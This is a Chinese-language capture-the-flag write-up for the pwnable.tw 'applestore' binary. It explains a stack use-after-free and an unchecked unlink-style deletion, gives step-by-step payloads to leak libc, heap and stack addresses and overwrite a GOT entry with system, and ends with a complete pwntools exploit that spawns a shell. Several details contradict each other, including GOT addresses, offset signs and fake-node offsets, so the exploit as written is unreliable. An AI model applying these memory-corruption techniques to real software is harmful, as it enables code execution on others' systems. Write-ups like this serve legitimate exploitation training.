# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc-2.23.so
- 缓解措施
  - Arch: i386-32-little
  - ASLR: on
  - PIE: No PIE (0x8048000)
  - NX: NX enabled
  - RELRO: Partial RELRO
  - Stack: Canary found

# 漏洞成因
## 程序关键结构体
程序使用一个双向链表来管理购物车中的商品，每个商品对应一个在堆上分配的结构体。在`checkout`函数触发彩蛋时，会在栈上临时创建一个结构体并插入链表。
```c
// 结构体布局（每个字段4字节）
struct Apple {
    char *name;     // 指向商品名称字符串的指针
    int price;      // 商品价格
    struct Apple *bk; // 指向链表前一个节点
    struct Apple *fd; // 指向链表后一个节点
};
```

## 漏洞定位
1.  **Use-After-Free (UAF) / 栈地址泄露**: 在`checkout()`函数中，当购物车总价恰好为7174时，程序会在栈上（局部变量`v2`）创建一个`Apple`结构体，并通过`insert()`将其插入全局链表`myCart`。`checkout()`函数返回后，该栈空间会被后续函数（如`cart()`, `add()`, `delete()`）的局部变量`nptr/buf`复用。由于链表仍持有该栈地址，后续通过`cart()`等功能可以读取或伪造该处的“结构体”内容，导致信息泄露和伪造数据结构。
    ```c
    unsigned int checkout() {
        // ...
        if ( v1 == 7174 ) {
            puts("*: iPhone 8 - $1");
            asprintf(v2, "%s", "iPhone 8"); // v2在栈上，相当于v2[0]=name
            v2[1] = (char *)1;              // v2[1]=price
            insert((int)v2);                // 将栈地址v2插入全局链表
            v1 = 7175;
        }
        // ...
    }
    ```
2.  **无检查的链表拆除（类unlink）**: `delete()`函数在从链表移除商品节点时，未对节点的`fd`和`bk`指针进行有效性检查，直接执行`fd->bk = bk`和`bk->fd = fd`操作。这允许攻击者通过伪造链表节点，实现任意地址写（Write-Anything-Anywhere）。
    ```c
    // delete() 关键代码
    v4 = *(_DWORD *)(v2 + 8); // bk
    v5 = *(_DWORD *)(v2 + 12); // fd
    if ( v5 )
        *(_DWORD *)(v5 + 8) = v4; // fd->bk = bk
    if ( v4 )
        *(_DWORD *)(v4 + 12) = v5; // bk->fd = fd
    ```

# 漏洞利用过程：
利用分为三个阶段：1) 触发彩蛋，将栈地址引入链表；2) 利用`cart()`功能泄露libc、堆和栈地址；3) 伪造链表节点，利用`delete()`的类unlink操作劫持控制流，最终通过覆写GOT表getshell。
- Step 1: 购买特定数量的商品，使总价达到7174，触发`checkout()`中的彩蛋，将一个栈上的结构体地址链入全局链表。
- Step 2-4: 利用`cart()`功能，通过构造特定的输入（`y\x00`后接伪造的结构体数据）泄露`read`的GOT表地址（计算libc基址）、堆地址（通过全局变量`myCart`），并通过遍历链表逐步追溯至栈地址。
- Step 5: 利用泄露的栈地址和`delete()`的漏洞，伪造第27个商品节点（即栈上的那个节点）的`bk`和`fd`指针，执行类unlink操作，将`handler()`函数栈帧中的返回地址附近区域指向GOT表附近。
- Step 6: 在后续的`my_read`调用中，向被劫持的地址写入`system`地址和字符串“sh”，从而覆写GOT表中的`asprintf`函数指针为`system`，最终在调用`asprintf`时执行`system("sh")`。

## Step 1
通过购买16个iPhone 6 (单价199)和10个iPad Mini 3 (单价399)，使总价达到`16*199 + 10*399 = 7174`，触发彩蛋。
- 栈内存`0xff9a5a98`处，被`checkout()`函数的局部变量`v2`数组占用，其内容被初始化为一个`Apple`结构体：`name`指向字符串“iPhone 8”，`price=1`，`bk`和`fd`被`insert()`函数修改以链入全局链表`myCart`。此地址被永久记录在链表中。

## Step 2
调用`cart()`功能，发送Payload `b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)`。
- Payload以`y\x00`开头，满足`cart()`的检查，后续数据覆盖了栈上原`Apple`结构体的内存。
- 程序将`0x0804b040` (`read@got.plt`) 解释为`name`指针，`0`解释为`price`，后续两个`0`解释为`bk`和`fd`。
- 当`cart()`打印第27个商品（即栈上的伪造结构体）时，会打印`name`指向的内容，从而泄露`read`函数在libc中的实际地址`0xf7d786a6`。
- 计算得到libc基址：`libc_base = leaked_read_addr - libc.symbols['read']`。

## Step 3
再次调用`cart()`，发送Payload `b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)`。
- `0x0804B070`是全局变量`myCart`的地址（即`dword_804B070`）。
- 程序将其解释为`name`指针并打印其内容，即链表中第一个堆结构体的地址`0x089ba678`，从而泄露堆地址起始点。

## Step 4
利用泄露的堆地址，通过多次调用`cart()`并动态构造Payload（每次将`name`指针设置为当前节点的`fd`指针地址），沿着链表遍历26次，最终追踪到链入链表的栈地址`0xff9a5a98`。
- 此过程揭示了链表如何从堆区域连接到栈区域。

## Step 5
调用`delete()`功能，删除第27个商品（栈上的伪造节点）。发送Payload `b'27\x00' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)`。
- Payload的前4个字节`"27\x00"`用于`atoi`，后续数据覆盖栈上的伪造`Apple`结构体。
- 此时，伪造的结构体内容为：`name=0`，`price=0`，`bk = stack_addr+0x14` (`stack_addr+0x20-0xc`)，`fd = 0x0804b058` (`elf.got['asprintf']+0x22`)。
- 执行`delete()`中的链表拆除操作：
    - `fd->bk = bk` => `*(0x0804b058 + 8) = stack_addr+0x14`。这会将`handler`函数栈帧中`nptr`数组附近的地址（用于存储`my_read`的输入）修改为指向`stack_addr+0x14`（一个栈地址）。
    - `bk->fd = fd` => `*(stack_addr+0x14 + 12) = 0x0804b058`。这会将栈上的某个值修改为GOT表地址`0x0804b058`。
- 核心效果是：劫持了`handler`函数中下一次`my_read`的输入目标地址`(dest)`，使其指向`asprintf`的GOT表地址`0x0804b040`附近（`+0x22`的调整是为了对齐输入数据的位置）。

## Step 6
在`delete()`操作完成后，程序循环回`handler()`的起点，等待新的输入。此时发送Payload `b'sh\x00\x00' + p32(system_addr)`。
- 该输入被`my_read`写入到被劫持的目标地址（`asprintf`的GOT表条目处）。
- 字符串`"sh\x00\x00"`被写入`0x0804b040`起始处，`p32(system_addr)`被写入`0x0804b044`起始处，从而将`asprintf`的GOT表指针覆盖为`system`函数的地址。
- 当程序后续再次调用`asprintf`（例如，在`create`或`checkout`中）时，实际会执行`system("sh")`，获得shell。

# Exploit：
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.binary = './applestore'
elf = context.binary
libc = ELF('./libc_32.so.6')  # 使用对应的libc文件

if args.REMOTE:
    io = remote('chall.pwnable.tw', 10104)
else:
    io = process('./applestore')

def add_item(index, count):
    for _ in range(count):
        io.sendlineafter('>', '2')
        io.sendlineafter('Device Number> ', str(index))

def leak_addr(payload):
    io.sendlineafter('>', '4')
    io.sendlineafter('Let me check your cart. ok? (y/n) > ', payload)
    io.recvuntil('27: ')
    leaked = u32(io.recv(4))
    return leaked

# Step 1: 触发彩蛋，将栈地址链入链表
add_item(4, 10)  # 10个 iPad Mini 3
add_item(1, 16)  # 16个 iPhone 6
io.sendlineafter('>', '5')  # checkout
io.sendlineafter('Let me check your cart. ok? (y/n) > ', 'y')  # 触发7174总价判断

# Step 2: 泄露libc地址
payload = b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)
read_addr = leak_addr(payload)
libc.address = read_addr - libc.symbols['read']
system_addr = libc.symbols['system']
log.success('libc base: ' + hex(libc.address))
log.success('system addr: ' + hex(system_addr))

# Step 3: 泄露堆地址（链表头）
payload = b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)
heap_head = leak_addr(payload)
log.success('heap head: ' + hex(heap_head))

# Step 4: 通过遍历链表泄露栈地址
stack_addr = heap_head
for i in range(26):
    # 每次将name指针设置为当前节点的fd指针位置
    payload = b'y\x00' + p32(stack_addr + 8) + p32(0) + p32(0) + p32(0)
    io.sendlineafter('>', '4')
    io.sendlineafter('Let me check your cart. ok? (y/n) > ', payload)
    io.recvuntil('27: ')
    stack_addr = u32(io.recv(4))
log.success('stack addr: ' + hex(stack_addr))

# Step 5: 构造unlink攻击，劫持栈上输入目标至GOT表
# 计算栈上可控结构体的地址
fake_node_addr = stack_addr - 0x10  # 根据栈布局调整
# 伪造bk和fd指针，目标是使后续my_read写入asprintf的GOT表项
# bk -> 指向栈上合适位置（用于接收fd写入）
# fd -> 指向asprintf的GOT表项附近（-0x22用于对齐后续输入的"sh"字符串）
payload = b'27\x00' + p32(0) + p32(0) + p32(fake_node_addr + 0x20 - 0xc) + p32(elf.got['asprintf'] + 0x22)
io.sendlineafter('>', '3')  # delete
io.sendlineafter('Item Number> ', payload)

# Step 6: 向被劫持的地址写入system地址和"sh"字符串
# 此时my_read的目标地址已被篡改为asprintf@got.plt附近
payload = b'sh\x00\x00' + p32(system_addr)
io.sendline(payload)  # 这个输入会被handler的主循环读取并处理

io.interactive()
```